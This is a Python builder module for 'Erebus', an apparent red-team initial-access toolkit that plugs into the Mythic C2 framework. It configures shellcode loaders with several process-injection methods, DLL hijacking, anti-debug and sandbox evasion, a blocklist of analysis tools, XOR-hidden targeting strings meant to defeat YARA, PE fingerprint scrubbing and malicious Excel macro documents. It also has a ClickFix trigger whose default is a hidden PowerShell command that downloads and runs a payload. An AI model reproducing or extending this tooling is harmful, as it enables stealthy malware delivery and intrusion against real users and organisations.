'''
- Author(s): Lavender-exe // hunterino-sec // Whispergate
- Title: Erebus // erebus_wrapper
- Description: Initial Access Wrapper
'''

from erebus_wrapper.erebus.modules.plugin_loader import get_plugin_loader
from erebus_wrapper.erebus.modules import run_plugin_validation, report_validation_results

_plugin_loader = get_plugin_loader()

# Auto-inject every function exported by a loaded plugin into the builder's
# module namespace. The source of truth is `_plugin_loader.functions`, which
# plugin_loader.load_all_plugins() builds by calling each ErebusPlugin's
# register() and collecting the returned {name: callable} mappings. Only
# what a plugin explicitly exports via register() lands here - internal
# archive helpers stay private.
#
# Historical note (pre-R1c): this used to be a hand-maintained
# _PLUGIN_FUNCTIONS list + explicit get_function() loop. Any plugin-side
# rename that wasn't mirrored in the list would silently bind the old name
# to None, and the build would crash at call time deep inside build() with
# "'NoneType' object is not callable". Auto-discovery + the integrity
# assertion below fail loudly at import time instead.
globals().update(_plugin_loader.functions)

# Integrity check: every plugin function the builder currently calls should
# resolve after auto-discovery. Missing names get logged upfront so the
# root cause is visible in the Mythic build log, but are not hard-asserted:
# a plugin can legitimately fail to load when its host environment is
# missing an optional dependency (e.g. py7zr, pycdlib, pylnk3, openpyxl in
# bare Python environments), and taking the whole builder out in that
# situation is stricter than the pre-refactor behaviour.
#
# Pre-R1c the builder did `globals()[n] = _plugin_loader.get_function(n)`
# which silently bound missing names to None; build() would then crash with
# "'NoneType' object is not callable" at call time. Post-R1c the name is
# simply not bound and the failure manifests as AttributeError at call
# time - strictly clearer, behaviour-preserving, and the warning below
# gives an upfront diagnostic that pre-R1c had no equivalent for.
_REQUIRED_PLUGIN_FUNCTIONS = [
    "generate_proxies",
    "build_clickonce", "build_msi", "hijack_msi",
    "add_multiple_files_to_msi", "create_custom_action",
    "create_payload_trigger", "create_bat_payload_trigger",
    "create_msi_payload_trigger", "create_clickonce_trigger",
    "create_msc_explorer_trigger", "create_html_smuggling_trigger",
    "create_clickfix_trigger",
    "build_7z", "build_zip", "build_iso", "build_electron_installer",
    "self_sign_payload", "get_remote_cert_details", "sign_with_provided_cert",
    "generate_excel_payload", "backdoor_existing_excel",
    "generate_command_execution_vba",
    "generate_xll_template", "register_xll_function",
    "sanitize_pe", "generate_self_hunt_rules",
    # R2a - shellcode_obfuscation helpers
    "build_obfuscation_cmd", "build_key_extraction_cmd", "build_raw_key_cmd",
    "parse_key_iv", "extract_raw_key_array",
    # R2b - loader_config helper
    "build_loader_config_data",
]
_missing = [n for n in _REQUIRED_PLUGIN_FUNCTIONS if n not in globals()]
if _missing:
    print(
        f"[Plugin] WARNING: builder expects but cannot find these plugin functions: "
        f"{_missing}. A plugin either failed to load or renamed a registered function. "
        f"Any build path using these names will fail with AttributeError at call time. "
        f"Check the [Plugin] Error log lines above for load errors."
    )

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from pathlib import PurePath
# distutils was removed in Python 3.12; shutil.copytree(..., dirs_exist_ok=True)
# matches the merge-into-existing-dir semantics the old copy_tree provided.
from jinja2 import Environment, FileSystemLoader
from datetime import datetime
from pathlib import Path
import os
import tempfile
import shutil
import hashlib
import asyncio
import io
import subprocess
import zipfile
import secrets

# ============================================================================
# Guardrail string encryption
# ============================================================================
# Guardrail allowlist/blocklist entries (hostnames, usernames, domains, IPs)
# used to be emitted as plaintext `const char*` arrays in the compiled loader,
# which meant `strings` on a delivered sample trivially leaked target scoping
# data. We now XOR-encrypt each entry at build time with a per-build random
# key and emit byte arrays; the generated DecryptGuardrails() stub decrypts
# them in place on first call inside GetGuardrailConfig().
#
# This defeats static string hunts and family-level YARA. It does not defeat
# a determined reverse engineer (the key is next to the ciphertext) - that's
# acceptable for guardrail scoping data, where the goal is to frustrate
# automated triage and avoid leaking operator targeting to incident response.

GUARDRAIL_LIST_KEYS = [
    "GUARDRAIL_ALLOWED_HOSTNAMES",
    "GUARDRAIL_BLOCKED_HOSTNAMES",
    "GUARDRAIL_BLOCKED_USERNAMES",
    "GUARDRAIL_ALLOWED_IPS",
    "GUARDRAIL_BLOCKED_IPS",
    "GUARDRAIL_ALLOWED_DOMAINS",
]

def build_guardrail_encryption(gr_lists: dict) -> dict:
    """Encrypt guardrail string lists with a per-build XOR key.

    Input:  { "GUARDRAIL_ALLOWED_HOSTNAMES": ["host1", "host2"], ... }
    Output: template vars consumed by config.hpp:
        GR_XOR_KEY          -> list[int]  (16 random bytes)
        GR_ENC_<LIST_NAME>  -> list[list[int]]  per-entry ciphertext
                               (includes trailing NUL byte, also XORed)
        GR_COUNT_<LIST_NAME>-> int  (number of entries, convenience)
    """
    key = list(secrets.token_bytes(16))
    out = {"GR_XOR_KEY": key}
    for name in GUARDRAIL_LIST_KEYS:
        entries = gr_lists.get(name, []) or []
        enc_entries = []
        for s in entries:
            raw = s.encode("utf-8") + b"\x00"
            ct = [raw[i] ^ key[i % len(key)] for i in range(len(raw))]
            enc_entries.append(ct)
        out[f"GR_ENC_{name}"] = enc_entries
        out[f"GR_COUNT_{name}"] = len(enc_entries)
    return out


ENCRYPTION_METHODS = {
    "AES_ECB"    :  "aes_ecb",
    "AES_CBC"    :  "aes_cbc",
    "RC4"        :  "rc4",
    "XOR"        :  "xor",
}

COMPRESSION_METHODS = {
    "LZNT1": "lznt",
    "RLE"  : "rle",
    "NONE" : ""
}

ENCODING_METHODS = {
    "ALPHA32" : "alpha",
    "ASCII85" : "ascii85",
    "BASE64"  : "base64",
    "WORDS256": "words",
    "NONE"    : ""
}

# Compression type mappings for config templates
COMPRESSION_TYPE_MAP = {
    "NONE" : 0,
    "LZNT1": 1,
    "RLE"  : 2,
}

# Encoding type mappings for config templates
ENCODING_TYPE_MAP = {
    "NONE"   : 0,
    "BASE64" : 1,
    "ASCII85": 2,
    "ALPHA32": 3,
    "WORDS256": 4,
}

#
# Commented out to reduce confusion
# uncomment the ones that you will use on your custom loader
#
SHELLCODE_FORMAT = {
    "C"          : "c",
    "CSharp"     : "csharp",
    "Raw"        : "raw",
}

FINAL_PAYLOAD_EXTENSIONS = [
    "7z",
    "zip",
    "tar",
    "tar.gz",
    "iso",
    "msi"
]


def parse_csv(value):
    """Split a CSV parameter value into a trimmed, non-empty list.

    Used across guardrail parameter extraction (Shellcode Loader, ClickOnce,
    DLL Hijack). Previously defined as two nested duplicates inside build()
    - see the R1a refactor.
    """
    if not value or not isinstance(value, str):
        return []
    return [item.strip() for item in value.split(',') if item.strip()]


def array_to_csharp_string(lst):
    """Render a Python list as a C# string-array literal body.

    Produces `"a", "b", "c"` (no brackets). Consumed by the ClickOnce
    InjectionConfig.cs template where fields expect inline string-array
    initializer bodies.
    """
    if not lst or len(lst) == 0:
        return ""
    return ", ".join(f'"{item}"' for item in lst)


def collect_guardrail_gr_lists(wrapper, enabled: bool, param_names: dict) -> dict:
    """Assemble the GUARDRAIL_* dict fed into the config.hpp Jinja template.

    `param_names` maps each GUARDRAIL_* key to the Mythic parameter name
    that supplies its CSV value, for example::

        {
            "GUARDRAIL_ALLOWED_HOSTNAMES": "0.5g Hostname Whitelist",
            ...
        }

    Passing parameter names explicitly (rather than assuming a letter-offset
    convention) keeps this helper usable from the Shellcode Loader site
    (`0.5g`-`0.5l`) and the DLL Hijack site (`1.1f`-`1.1k`) even though the
    two schemas don't share a letter alignment - if a schema drifts, each
    call site updates its own name list independently.

    Returns a dict pre-merged with `build_guardrail_encryption(gr_lists)` so
    callers do not have to remember the double-splat idiom.
    """
    gr_lists = {
        key: (parse_csv(wrapper.get_parameter(pname)) if enabled else [])
        for key, pname in param_names.items()
    }
    return {**gr_lists, **build_guardrail_encryption(gr_lists)}


def _finalize_pe_artifact(
    payload_path: str,
    payload_dir: str,
    *,
    build_config: str = "release",
) -> str:
    """Run post-compile PE finalization on a just-built PE.

    Sequence (release builds only):
      1. sanitize_pe() - scrub MinGW / compiler fingerprints from the PE
         before anything downstream consumes it (codesign, packaging,
         IOC hashing).
      2. generate_self_hunt_rules() - emit per-build YARA + Sigma rules
         alongside the payload so operators can validate the artifact
         against the target SIEM before delivery.

    Both steps are non-fatal by contract: failures append warning lines to
    the returned string rather than raising, so the build always proceeds.
    The returned string is appended to the builder's `output` accumulator
    (which feeds `response.build_stdout`); an empty return is valid when
    both steps succeed silently (self_hunt does append a success line, so
    in practice the return is non-empty on success).

    build_config == "debug" skips both steps entirely. Debug binaries are
    never delivered to targets (they're O0 + contain DWARF, fingerprintable
    trivially on sight), so the sanitizer has no OPSEC value on them and
    has historically caused load failures on Windows when it inadvertently
    touched something the runtime still referenced. Leaving debug builds
    untouched is both the correct policy and the safer one.
    """
    if build_config == "debug":
        return "[pe_sanitize] skipped on debug build\n"
    lines = []
    try:
        sanitize_pe(payload_path)
    except Exception as san_err:
        lines.append(f"[pe_sanitize] warning: {san_err}")
    try:
        sh = generate_self_hunt_rules(payload_path, payload_dir)
        lines.append(f"[self_hunt] {sh['rule_name']} -> {sh['yara']}")
    except Exception as sh_err:
        lines.append(f"[self_hunt] warning: {sh_err}")
    return ("\n".join(lines) + "\n") if lines else ""


# Default debugger / analysis process blocklist rendered into ClickOnce
# InjectionConfig.cs `BlockedProcesses`. Covers native debuggers, .NET
# decompilers, process monitors, traffic inspectors, and common sandbox
# harness processes. Hoisted from a nested local in build() so it is a
# single canonical list rather than re-initialized on every ClickOnce build.
DEFAULT_BLOCKED_PROCESSES = [
    # Native debuggers
    "x64dbg", "x32dbg", "windbg", "ollydbg", "ida", "ida64",
    "immunitydebugger", "radare2",
    # .NET decompilers / analysis
    "dnspy", "dnspyex", "dotpeek", "ilspy",
    "jetbrains.rider", "reflector", "de4dot", "ildasm",
    # Process monitors / system inspectors
    "processhacker", "procmon", "procmon64", "procexp",
    "procexp64", "autoruns", "autorunsc",
    # Traffic inspection
    "wireshark", "dumpcap", "tcpdump", "fiddler",
    "fiddler everywhere", "charles", "burpsuite",
    # Sandboxing / analysis harnesses
    "sbiectrl", "sandboxiedcomlaunch", "cuckoo",
]


class ErebusWrapper(PayloadType):
    name = "erebus_wrapper"
    author = "@Lavender-exe, @hunterino-sec"
    semver = "v0.0.3"
    
    note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"

    file_extension = "zip"
    supported_os = [
        SupportedOS.Windows
    ]

    wrapper = True
    wrapped_payloads = ["merlin", "kharon", "ceos"
                        "sliver", "apollo", "athena",
                        "xenon", "nimplant", "hannibal"]
    c2_profiles = []

    # Plugin validation flag - run only once at startup
    _validation_run = False

    agent_type = AgentType.Wrapper
    agent_path = PurePath(".") / "erebus_wrapper"
    _agent_icon_path = Path(__file__).resolve().parent.parent / "Erebus.png"
    agent_icon_path = str(_agent_icon_path)
    agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"

    build_parameters = [
        BuildParameter(
            name = "0.0 Main Payload Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the main payload type (Shellcode Loader or DLL Hijack)
NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
""",
            choices = ["Loader", "Hijack"],
            default_value="Loader",
        ),

        BuildParameter(
            name = "0.0a Enable Custom Shellcode",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Upload custom raw shellcode from an external C2 (e.g. Cobalt Strike, Havoc, Sliver). "
                "When enabled the Mythic-wrapped payload is ignored and the uploaded file is used as "
                "the shellcode source. The file must be raw position-independent shellcode - "
                "PE files (MZ header) are rejected."
            ),
            default_value = False,
            required = False,
        ),

        BuildParameter(
            name = "0.0b Custom Shellcode File",
            parameter_type = BuildParameterType.File,
            description = (
                "Raw shellcode blob to use instead of the Mythic-wrapped payload "
                "(e.g. a .bin produced by msfvenom, CS payload generator, etc.). "
                "Must be raw shellcode - PE files will be rejected."
            ),
            required = False,
            hide_conditions = [
                HideCondition(name="0.0a Enable Custom Shellcode", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.1 Loader Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the type of loader to use",
            choices = ["ClickOnce", "Shellcode Loader"],
            default_value = "Shellcode Loader",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.2 Loader Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Select the loader's output format. "
                "exe = standard PE executable. "
                "dll = DLL (side-loadable, regsvr32). "
                "xll = Excel Add-In DLL (xlAutoOpen trigger)"
            ),
            choices = [
                "exe", 
                "dll", 
                "xll"
                ],
            default_value = "exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.2a Loader Architecture",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
            ]
        ),

        BuildParameter(
            name = "0.3 Loader Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config. Release is the shippable mode: symbols stripped, rich header scrubbed, PE timestamp zeroed, debug directory blob wiped. Debug keeps symbols and leaves forensic metadata intact - use only for local testing.",
            choices = ["release", "debug", "test"],
            default_value = "release",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
            ]
        ),

        BuildParameter(
            name = "0.3 ClickOnce Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.3a ClickOnce Architecture",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the ClickOnce loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        # Shellcode Loader Injection Configuration
        BuildParameter(
            name = "0.4 Shellcode Loader - Injection Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection technique for the Shellcode Loader:
1 = NtMapViewOfSection (Remote)
2 = CreateFiber (Self)
3 = EarlyCascade (Remote)
4 = PoolParty (Remote)
5 = NtQueueApcThread (Remote)""",
            choices = ["1", "2", "3", "4", "5"],
            default_value = "3",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.5 Shellcode Loader - Target Process",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection",
            default_value = "C:\\Windows\\System32\\notepad.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
            ]
        ),

        # Guardrails Configuration
        BuildParameter(
            name = "0.5a Enable Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable guardrails (environment and anti-debugging checks) for the loader",
            default_value = False,
        ),

        BuildParameter(
            name = "0.5b Check IsDebuggerPresent",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5c Check Remote Debugger",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for remote debugger via NtQueryInformationProcess",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5d Check Debugger Processes",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for known debugger and analysis tool processes",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5e Check Hardware Breakpoints",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for hardware breakpoints in debug registers",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f Check Timing Anomalies",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f1 Check Sandbox Environment",
            parameter_type = BuildParameterType.Boolean,
            description = "Detect VMs and sandboxes (hypervisor CPUID, low resources, sandbox artifacts, no recent user activity)",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5g Hostname Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5h Block Analysis Hostnames",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
            default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5i Block Analysis Usernames",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
            default_value = "analyst,malware,sandbox,user,admin",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5j IP Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5k IP Blacklist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
            default_value = "192.168.122.,172.16.,127.",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5l Domain Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        # Evasion backend toggles (config.hpp CONFIG_SYSCALL_BACKEND /
        # CONFIG_CALLSTACK_SPOOF_ENABLED). Both apply to the native C++
        # loader (Shellcode Loader + DLL Hijack); ClickOnce is unaffected.
        BuildParameter(
            name = "0.5m Syscall Backend",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Syscall dispatch layer for Nt* calls.\n"
                "TartarusGate: built-in indirect syscall shim page.\n"
                "SysWhispers3: generated Sw3Nt* stubs."
            ),
            choices = ["TartarusGate", "SysWhispers3"],
            default_value = "TartarusGate",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.5n Callstack Spoofing",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Enable Callstack Spoofing"
            ),
            default_value = False,
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.2a Loader Architecture", operand=HideConditionOperand.EQ, value="x86"),
            ]
        ),

        # Operator-selectable gadget host modules. InitCallstackSpoof() scans
        # each module's .text for `add rsp, 0x68; ret` (the disp is fixed by
        # callstack_spoof_gas.S's `sub rsp, 112`). Pick modules already mapped
        # into the host process — defaults cover every Win32 process.
        BuildParameter(
            name = "0.5o Callstack Spoof Modules",
            parameter_type = BuildParameterType.String,
            description = (
                "Comma-separated module names scanned for the `add rsp, 0x68; ret` gadget. "
                "First match wins. Modules must already be loaded in the host process "
                "(PEB-walk only, no LoadLibrary). "
                "Default: ntdll.dll,kernel32.dll,kernelbase.dll"
            ),
            default_value = "ntdll.dll,kernel32.dll,kernelbase.dll",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.2a Loader Architecture", operand=HideConditionOperand.EQ, value="x86"),
                HideCondition(name="0.5n Callstack Spoofing", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        # ClickOnce Loader Injection Configuration
        BuildParameter(
            name = "0.6 ClickOnce - Injection Method",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection method for ClickOnce:
earlycascade (remote)
poolparty (remote)
classic (remote)
createfiber (self)
enumdesktops (self)
appdomain (self)""",
            choices = ["createfiber", "earlycascade", "poolparty", "classic", "enumdesktops", "appdomain"],
            default_value = "createfiber",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.7 ClickOnce - Target Process",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection methods (leave empty for explorer.exe)",
            default_value = "explorer.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="createfiber"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="enumdesktops"),
            ]
        ),

        BuildParameter(
            name="0.8 Output Extension Source",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose source for the payload ignition and visible extension inside the container (Trigger or MalDoc)",
            choices=["Trigger", "MalDoc"],
            default_value="Trigger",
        ),

        BuildParameter(
            name="0.9 Trigger Type",
            parameter_type=BuildParameterType.ChooseOne,
            description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix"],
            default_value="BAT",
            required=False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
            ]
        ),

        BuildParameter(
            name = "0.9a Trigger Binary",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "C:\\Windows\\System32\\conhost.exe",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
            ]
        ),

        BuildParameter(
            name = "0.9b Trigger Command",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
            ]
        ),

        BuildParameter(
            name="0.9c ClickFix Command",
            parameter_type=BuildParameterType.String,
            description="Command copied to clipboard when user clicks verify button. Use a PowerShell download cradle or cmd chain.",
            default_value='powershell -w hidden -ep bypass -c "iwr -uri PAYLOAD_URL -outfile $env:TEMP\\update.exe; & $env:TEMP\\update.exe"',
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="ClickFix"),
            ]
        ),

  # MalDocs - Excel Backdooring
        BuildParameter(
            name="0.9 Create MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description="Create/backdoor Excel documents, export VBA module only, or disable MalDoc generation",
            choices=["None", "Create/Backdoor Excel", "VBA Module Only"],
            default_value="None",
            required=False,
            hide_conditions=[
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9a MalDoc Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Create new Excel document or backdoor an existing one",
            choices=["Create New", "Backdoor Existing"],
            default_value="Create New",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9b Excel Source File",
            parameter_type=BuildParameterType.File,
            description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9a MalDoc Type", operand=HideConditionOperand.NotEQ, value="Backdoor Existing"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9c VBA Execution Trigger",
            parameter_type=BuildParameterType.ChooseOne,
            description="VBA macro execution trigger method",
            choices=["AutoOpen", "OnClose", "OnSave"],
            default_value="AutoOpen",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9d Excel Document Name",
            parameter_type=BuildParameterType.String,
            description="Name/title for the Excel document",
            default_value="Invoice",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9e Obfuscate VBA",
            parameter_type=BuildParameterType.Boolean,
            description="Obfuscate VBA code to evade AV/EDR detection",
            default_value=True,
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f MalDoc Injection Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
            choices=["Command Execution", "Shellcode Injection"],
            default_value="Command Execution",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
